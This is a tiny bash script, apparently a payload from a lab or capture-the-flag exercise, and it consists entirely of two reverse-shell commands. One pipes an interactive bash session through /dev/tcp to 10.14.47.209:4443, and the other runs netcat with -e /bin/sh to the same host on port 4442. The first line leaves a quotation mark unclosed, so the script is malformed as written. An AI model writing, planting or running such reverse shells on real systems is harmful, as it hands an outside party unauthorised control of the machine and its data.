#!/bin/bash

bash -c 'bash -i &> /dev/tcp/10.14.47.209/4443
nc -e /bin/sh 10.14.47.209 4442
